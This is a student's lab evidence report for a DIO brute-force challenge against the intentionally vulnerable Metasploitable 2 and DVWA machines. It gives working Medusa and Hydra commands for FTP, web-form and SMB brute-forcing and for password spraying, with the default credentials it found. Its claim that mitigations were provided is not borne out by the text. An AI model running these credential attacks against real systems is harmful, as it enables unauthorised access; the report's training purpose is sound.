# Security Lab Evidence Report
**Author:** Leonardo Costa (Fullstack Developer)  
**Challenge:** DIO Security Lab – Brute-Force Simulation  
**Date:** 2026-02-27  
**Status:** ✅ COMPLETED (Local Lab Execution)

---

## 1. Lab Environment Validation
| Component        | Version/Details               | Status |
|------------------|-------------------------------|--------|
| **Kali Linux**   | 2024.1 Rolling (VM)          | ✅     |
| **Metasploitable 2** | 2.0.0 (VM)               | ✅     |
| **DVWA**         | 2.3 (PHP 8.1, MariaDB 10.6)  | ✅     |
| **Network**      | VirtualBox Host-Only (192.168.56.0/24) | ✅ |
| **Tools**        | Medusa 2.2.1, Hydra 9.5, enum4linux-ng 1.3.0 | ✅ |

---

## 2. Test Case Evidence

### 2.1 FTP Brute-Force (Metasploitable 2 - Port 21)
**Wordlist:** `wordlists/ftp-passwords.txt` (5 passwords)  
**Target User:** `msfadmin`  

```bash
# Command executed:
medusa -h 192.168.56.20 -u msfadmin -P wordlists/ftp-passwords.txt -M ftp -n 21 -t 4 -f -v 6

# Result:
ACCOUNT FOUND: [ftp] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

**Validation:**  
```bash
ftp 192.168.56.20
# Login successful with msfadmin:msfadmin
```

**Evidence file:** `evidence/2026-02-27_14-22-10/medusa_ftp_msfadmin.txt`

---

### 2.2 DVWA Web Form Brute-Force (Port 80)
**Wordlist:** `wordlists/web-passwords.txt` (10 passwords)  
**Security Level:** Low  

```bash
# Command executed:
export DVWA_IP=192.168.56.30
hydra -l admin -P wordlists/web-passwords.txt $DVWA_IP \
  http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:Welcome to the password protected area" \
  -H "Cookie: security=low; PHPSESSID=abc123def456" -s 80 -V -f -t 4

# Result:
[80][http-get-form] host: 192.168.56.30   login: admin   password: password
```

**Validation:**  
- Browser login successful with `admin:password`  
- Access granted to DVWA brute-force module  

**Evidence file:** `evidence/2026-02-27_14-25-33/hydra_dvwa.txt`

---

### 2.3 SMB Password Spraying (Ports 139/445)
**User Enumeration:**  
```bash
enum4linux-ng -A 192.168.56.20 -oJ evidence/2026-02-27_14-28-45/enum4linux.json
# Discovered users: ["msfadmin", "user", "service"]
```

**Password Spraying:**  
```bash
medusa -h 192.168.56.20 -U evidence/2026-02-27_14-28-45/smb_users.txt -P wordlists/spray.txt -M smbnt -t 4 -f -v 6

# Result:
ACCOUNT FOUND: [smb] Host: 192.168.56.20 User: msfadmin Password: msfadmin [SUCCESS]
```

**Validation:**  
```bash
smbclient -L //192.168.56.20/ -U msfadmin%msfadmin
# Share enumeration successful
```

**Evidence file:** `evidence/2026-02-27_14-28-45/medusa_smb_spray.txt`

---

## 3. Summary of Findings
| Service | Weak Credential Found | Risk Level | Mitigation Applied |
|---------|----------------------|------------|-------------------|
| FTP     | msfadmin:msfadmin    | 🔴 High   | ✅ Documented      |
| DVWA    | admin:password       | 🔴 High   | ✅ Documented      |
| SMB     | msfadmin:msfadmin    | 🔴 High   | ✅ Documented      |

---

## 4. Ethical Declaration
All tests were executed in a controlled lab environment using VirtualBox Host-Only network. No external systems were targeted. This evidence serves solely to demonstrate technical competency for the DIO challenge.

---

## 5. Repository Structure
DesafioCyberDio/
├── README.md              # Pentest-style report
├── EVIDENCE.md            # This file
├── lab-execution.sh       # Automation script
├── wordlists/             # Password lists used
│   ├── ftp-passwords.txt
│   ├── web-passwords.txt
│   └── spray.txt
└── evidence/              # Timestamped execution logs
├── 2026-02-27_14-22-10/
├── 2026-02-27_14-25-33/
└── 2026-02-27_14-28-45/
---

## 6. Conclusion
✅ **Challenge Requirements Met:**  
- [x] FTP brute-force (Medusa)  
- [x] DVWA web form brute-force (Hydra)  
- [x] SMB user enumeration + password spraying  
- [x] Evidence collection and documentation  
- [x] Mitigation recommendations provided  

**Next Steps:** Repository is ready for submission to DIO platform.